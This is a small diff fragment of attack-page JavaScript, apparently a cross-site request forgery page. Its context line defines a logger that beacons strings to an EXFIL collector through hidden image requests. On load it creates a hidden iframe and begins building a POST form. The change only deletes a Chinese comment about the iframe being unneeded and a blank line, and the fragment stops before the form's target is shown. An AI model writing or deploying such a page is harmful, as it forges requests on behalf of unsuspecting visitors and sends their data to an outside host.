@@ -7,12 +7,10 @@ function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=
 window.onload = () => {
   log('start');
 
-  // 原用于接收 form 响应的 iframe 已无用，但保留不影响（可删除）
   const f1 = document.createElement('iframe');
   f1.name = 'x';
   f1.style.display = 'none';
   document.body.appendChild(f1);
-
 
   const form = document.createElement('form');
   form.method = 'POST';
